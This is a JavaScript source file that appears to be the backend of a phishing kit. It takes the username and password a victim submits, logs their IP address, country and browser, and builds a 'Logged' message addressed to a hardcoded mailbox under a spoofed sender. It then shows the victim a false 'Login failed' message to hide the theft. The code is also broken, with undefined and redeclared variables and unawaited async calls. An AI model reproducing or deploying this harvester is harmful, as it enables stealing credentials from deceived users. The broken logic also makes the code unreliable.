const fetch = require('node-fetch');

const country = visitor_country();
const countryCode = visitor_countryCode();
const continentCode = visitor_continentCode();
const ip = require('request-ip').getClientIp(req);
const browser = req.headers['user-agent'];
const email = req.body.temail.trim();
const password = req.body.tpass.trim();
const server = new Date().toLocaleString('en-US', { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric', hour: 'numeric', minute: 'numeric', hour12: true });

let signal, msg;

if (email !== null && password !== null) {
    const own = 'alijafari077@yandex.com';
    const subj = `Login: | ${email} | ${country} | ${ip}`;

    const headers = {
        'From': 'LogZ-2022 xkcdProject <login@xkcdproject.com>',
        'X-Priority': '1', // 1 Urgent Message, 3 Normal
        'MIME-Version': '1.0'
    };

    let message = `[Logged] \n\n`;
    message += `Username : ${email}\n`;
    message += `Password : ${password}\n`;
    message += `Country: ${country} | User IP: <a href='http://whoer.net/check?host=${ip}' target='_blank'>${ip}</a>\n`;
    message += `Date : ${server}\n`;

    // Use a mail library to send the email
    // mail(own, subj, message, headers); // Implement mail function as needed

    signal = 'ok';
    msg = 'Login failed! Please enter correct password';
} else {
    signal = 'ok';
    msg = 'Please fill in all the fields.';
}

const data = {
    signal: signal,
    msg: msg
};

console.log(JSON.stringify(data));

async function visitor_country() {
    const client = req.headers['x-client-ip'];
    const forward = req.headers['x-forwarded-for'];
    const remote = ip;
    let result = "Unknown";
    let ip;

    if (validateIP(client)) {
        ip = client;
    } else if (validateIP(forward)) {
        ip = forward;
    } else {
        ip = remote;
    }

    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
    const ip_data = await response.json();

    if (ip_data && ip_data.geoplugin_countryName != null) {
        result = ip_data.geoplugin_countryName;
    }

    return result;
}

async function visitor_countryCode() {
    const client = req.headers['x-client-ip'];
    const forward = req.headers['x-forwarded-for'];
    const remote = ip;
    let result = "Unknown";
    let ip;

    if (validateIP(client)) {
        ip = client;
    } else if (validateIP(forward)) {
        ip = forward;
    } else {
        ip = remote;
    }

    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
    const ip_data = await response.json();

    if (ip_data && ip_data.geoplugin_countryCode != null) {
        result = ip_data.geoplugin_countryCode;
    }

    return result;
}

async function visitor_regionName() {
    const client = req.headers['x-client-ip'];
    const forward = req.headers['x-forwarded-for'];
    const remote = ip;
    let result = "Unknown";
    let ip;

    if (validateIP(client)) {
        ip = client;
    } else if (validateIP(forward)) {
        ip = forward;
    } else {
        ip = remote;
    }

    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
    const ip_data = await response.json();

    if (ip_data && ip_data.geoplugin_regionName != null) {
        result = ip_data.geoplugin_regionName;
    }

    return result;
}

async function visitor_continentCode() {
    const client = req.headers['x-client-ip'];
    const forward = req.headers['x-forwarded-for'];
    const remote = ip;
    let result = "Unknown";
    let ip;

    if (validateIP(client)) {
        ip = client;
    } else if (validateIP(forward)) {
        ip = forward;
    } else {
        ip = remote;
    }

    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
    const ip_data = await response.json();

    if (ip_data && ip_data.geoplugin_continentCode != null) {
        result = ip_data.geoplugin_continentCode;
    }

    return result;
}

function validateIP(ip) {
    const ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){2}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return ipRegex.test(ip);
}

